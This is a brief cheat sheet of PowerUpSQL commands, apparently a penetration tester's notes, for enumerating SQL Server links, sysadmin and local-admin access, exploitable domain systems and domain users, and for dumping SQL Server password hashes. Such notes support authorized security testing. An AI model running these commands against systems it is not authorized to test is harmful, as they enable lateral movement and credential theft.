tool link:
https://github.com/NetSPI/PowerUpSQL

---
get sql server links
```
Get-SQLServerLink -Verbose
```
---
crawl all over the server links, also check the sysadmin access
```
Get-SQLServerLinkCrawl -Verbose
```
---
check the exploitable sql servers
```
Get-SQLDomainExploitableSystem -Verbose
```
---
get domain sql user
```
Get-SQLDomainUser
```
---
local admin check 
```
Get-SQLLocalAdminCheck
```
---
grab password hashes using powerupsql
```
Get-SQLServerPasswordHash
```
---
check sysadmin privs on servers
```
Get-SQLSysadminCheck -Instance {SERVER_NAME} -Verbose
```

